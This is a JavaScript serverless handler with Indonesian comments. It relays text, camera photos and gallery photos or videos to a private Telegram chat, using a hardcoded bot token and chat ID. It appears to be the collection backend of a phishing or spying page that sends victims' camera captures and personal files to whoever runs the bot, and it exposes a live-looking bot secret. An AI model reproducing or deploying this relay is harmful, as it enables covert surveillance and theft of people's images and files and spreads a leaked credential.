const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
const CHAT_ID = "6126622503";

export default async function handler(req, res) {
    // ===== 1. GET untuk pesan teks =====
    if (req.method === 'GET' && req.query.msg) {
        try {
            const text = decodeURIComponent(req.query.msg);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text })
            });
            res.status(200).send('OK');
        } catch(e) {
            res.status(500).json({ error: e.message });
        }
        return;
    }

    // ===== 2. POST untuk foto & file galeri =====
    if (req.method === 'POST') {
        try {
            const { img, ts, filename, type } = req.body;
            // Kalo kirim file dari galeri (bisa video)
            if (type === 'video' && req.body.video) {
                // Kirim sebagai document biar gak di-compress
                const buf = Buffer.from(req.body.video, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', new Blob([buf], { type: 'video/mp4' }), filename || 'video.mp4');
                formData.append('caption', `📹 Galeri | ${new Date(ts).toISOString()}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
                res.status(200).send('OK');
                return;
            }

            // Kirim foto (dari kamera atau galeri)
            if (img) {
                const buf = Buffer.from(img, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', new Blob([buf], { type: 'image/jpeg' }), filename || `foto_${ts}.jpg`);
                formData.append('caption', `📸 ${filename || 'Kamera'} | ${new Date(ts).toISOString()}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                res.status(200).send('OK');
                return;
            }

            res.status(400).send('No media');
        } catch(e) {
            console.error(e);
            res.status(500).json({ error: e.message });
        }
        return;
    }

    res.status(200).send('Bot Aktif!');
}
